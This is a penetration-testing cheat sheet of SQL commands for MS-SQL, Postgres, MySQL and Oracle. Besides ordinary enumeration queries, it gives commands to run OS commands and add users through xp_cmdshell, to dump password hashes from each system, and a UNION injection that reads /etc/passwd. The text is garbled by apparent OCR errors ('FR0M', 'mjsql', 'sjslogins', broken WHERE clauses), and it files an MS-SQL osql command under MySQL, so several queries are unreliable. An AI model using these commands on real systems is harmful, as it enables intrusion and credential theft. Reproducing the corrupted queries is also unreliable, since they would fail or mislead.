# Databases

Ms-sql

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>Command</b>
      </th>
      <th style="text-align:left"><b>Description</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">SELECT @@version</td>
      <td style="text-align:left">DB version</td>
    </tr>
    <tr>
      <td style="text-align:left">EXEC xp_msver</td>
      <td style="text-align:left">Detailed version info</td>
    </tr>
    <tr>
      <td style="text-align:left">EXEC master..xp_cmdshell &apos;net user&apos;</td>
      <td style="text-align:left">Run OS command</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT HOST_ NAME()</td>
      <td style="text-align:left">Hostname &amp; IP</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT DB_ NAME()</td>
      <td style="text-align:left">Current DB</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT name FROM master..sysdatabases;</td>
      <td style="text-align:left">List DBs</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT user name()</td>
      <td style="text-align:left">Current user</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT name FROM master .. sjslogins</td>
      <td style="text-align:left">List users</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>SELECT name FROM master..sysobjects WHERE</p>
        <p>xtype= &apos;U&apos;;</p>
      </td>
      <td style="text-align:left">List tables</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p></p>
        <p>SELECT name FROM syscolumns WHERE id=(SELECT</p>
        <p>id FR0M sysobjects WHERE name- &apos;mjtable&apos; ) ;</p>
      </td>
      <td style="text-align:left">List columns</td>
    </tr>
  </tbody>
</table>### System table containing info on all tables

```text
SELECT TOP 1 TABLE_NAME FROM INFORMATION SCHEMA.TABLES
```

### List all tables/columns

```text
SELECT name FROM Syscolumns WHERE id
(SELECT id FROM Sysobjects WHERE
name= 'mytable')
```

### Password hashes \(2005\)

```text
SELECT name, password hash FROM master.sys.sgl_logins
```

## Postgres

| **Command** | **Description** |
| :--- | :--- |
| SELECT version\(\); | DB version |
| SELECT inet server\_addr\(\) | Hostname & IP |
| SELECT current database\(\); | Current DB |
| SELECT datname FROM pg database; | List DBs |
| SELECT user; | Current user |
| SELECT username FROM pg\_user; | List users |
| SELECT username,passwd FROM pg shadow | List password hashes |

### List columns

```text
SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A,
pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND
(A.attrelid=C.oid) AND (A.atttjpid=T.oid) AND (A.attnum 0) AND (NOT
A.attisdropped) AND (N.nspname ILIKE 'public')
```

### List tables

```text
SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN
pg catalog.pg namespace n ON n.oid = c.relnamespace WHERE c.relkind IN
( 'r',") AND n.nspname NOT IN ( 'pg catalog', 'pg toast') AND
pg_catalog.pg_table_is_visible(c.oid)
```

## Mysql

| **Command** | **Description** |
| :--- | :--- |
| SELECT @@version; | DB version |
| SELECT @@hostname; | Hostname & IP |
| SELECT database\(\); | Current DB |
| SELECT distinct \(db\) FROM mjsql.db; | List DBs |
| SELECT user\(\); | Current user |
| SELECT user FROM mysql.user; | List users |
| SELECT host,user,password FROM mJsql.user; | List password hashes |

### List all tables & columns

```text
SELECT table schema, table name, column_ name FR0M
information scherna.columns WHERE
table schema != 'mysql' AND table schema != 'information schema'
```

### Execute os command through mysql

```text
osql -S ip , port -U sa -P pwd -Q "exec xp cmdshell `net user /add user
passr`"
```

### Read world-readable files

```text
UNION ALL SELECT LOAD FILE( '/etc/passwd');
```

### Write to file system

```text
SELECT * FROM mytable INTO dumpfile '/tmp/ somefile';
```

## Oracle 

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>Command</b>
      </th>
      <th style="text-align:left"><b>Description</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">SELECT * FROM v$version;</td>
      <td style="text-align:left">DB version</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT version FROM v$instance;</td>
      <td style="text-align:left">DB version</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT instance name FROM v$instance;</td>
      <td style="text-align:left">Current DB</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT name FROM v$database;</td>
      <td style="text-align:left">Current DB</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT DISTINCT owner FROM all_tables;</td>
      <td style="text-align:left">List DBs</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT user FROM dual;</td>
      <td style="text-align:left">Current user</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>SELECT username FROM all_users ORDER BY</p>
        <p>username;</p>
      </td>
      <td style="text-align:left">List users</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT column name FROM all_tab_columns;</td>
      <td style="text-align:left">List columns</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT table name FROM all_tables;</td>
      <td style="text-align:left">List tables</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT name, password, astatus FROM sys.user$;</td>
      <td style="text-align:left">List password hashes</td>
    </tr>
  </tbody>
</table>### List DBAs

```text
SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES';
```
